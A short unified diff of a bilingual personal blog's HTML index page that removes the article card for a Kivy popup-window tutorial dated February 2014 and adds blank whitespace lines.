@@ -1005,21 +1413,45 @@ hg push</code></pre></div>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/kivy_popup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/kivy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">How to build a responsive popup window with scrolling capability in Kivy</h3>
-      <h3 class="title" lang="el">Πως να φτιάξετε ένα ευέλικτο αναδυόμενο παράθυρο με δυνατότητα κύλισης στην Kivy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Feb 2014</time>
-      <time lang="el">19 Φεβ 2014</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
            
           
            
